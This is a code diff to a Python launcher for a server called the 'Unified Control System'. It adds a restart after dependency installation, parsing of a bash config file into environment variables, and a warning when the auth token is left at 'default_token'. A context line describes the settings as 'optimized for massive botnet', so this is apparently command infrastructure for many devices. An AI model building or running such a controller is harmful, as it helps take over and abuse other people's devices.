@@ -35,14 +35,11 @@ def check_and_install_dependencies():
                 sys.executable, '-m', 'pip', 'install', '--user'
             ] + missing)
             print("✅ Dependencies installed successfully")
+            print("🔄 Restarting to use new dependencies...")
             
-            # Re-import after installation
-            import importlib
-            for module in required_modules.keys():
-                try:
-                    importlib.import_module(module)
-                except ImportError:
-                    print(f"⚠️  Warning: {module} still not available after installation")
+            # Restart the script with the same arguments
+            os.execv(sys.executable, [sys.executable] + sys.argv)
+            
         except subprocess.CalledProcessError as e:
             print(f"❌ Failed to install dependencies: {e}")
             print("📋 Manual installation: pip install -r requirements.txt")
@@ -93,8 +90,37 @@ def detect_optimal_settings():
     print(f"⚙️  Optimized for massive botnet: {max_devices} max devices, {max_workers} workers, {memory_limit}MB memory limit")
     return max_devices, max_workers, memory_limit
 
+def load_config():
+    """Load configuration from unified_control_config.sh"""
+    config_file = 'unified_control_config.sh'
+    if os.path.exists(config_file):
+        print("📋 Loading configuration...")
+        try:
+            # Parse the bash config file and extract environment variables
+            with open(config_file, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line.startswith('export '):
+                        # Remove 'export ' prefix
+                        line = line[7:]
+                        # Split on first '=' only
+                        if '=' in line:
+                            key, value = line.split('=', 1)
+                            # Remove quotes from value
+                            value = value.strip('"').strip("'")
+                            os.environ[key] = value
+            print("✅ Configuration loaded successfully")
+        except Exception as e:
+            print(f"⚠️  Warning: Could not load config file: {e}")
+            print("   Using default values...")
+    else:
+        print("⚠️  Configuration file not found, using defaults")
+
 def start_system():
     print("🚀 Starting Unified Control System...")
+    
+    # Load configuration first
+    load_config()
     
     # Detect optimal settings
     max_devices, max_workers, memory_limit = detect_optimal_settings()
@@ -104,12 +130,19 @@ def start_system():
     os.environ['UC_MAX_WORKERS'] = str(max_workers)
     os.environ['UC_MEMORY_LIMIT'] = str(memory_limit)
     
+    # Get auth token from environment or generate warning
+    auth_token = os.environ.get('UC_AUTH_TOKEN')
+    if not auth_token or auth_token == 'default_token':
+        print("⚠️  WARNING: No secure auth token configured!")
+        print("   Edit unified_control_config.sh to set UC_AUTH_TOKEN")
+        auth_token = 'default_token'
+    
     # Start server
     print("📡 Starting server with optimized settings...")
     server_cmd = [
         'python3', 'unified_agent_with_ui.py',
         '--mode', 'server',
-        '--auth', os.environ.get('UC_AUTH_TOKEN', 'default_token'),
+        '--auth', auth_token,
         '--host', '0.0.0.0',  # Allow mobile connections
         '--ws-port', os.environ.get('UC_WS_PORT', '8765'),
         '--http-port', os.environ.get('UC_HTTP_PORT', '8766'),
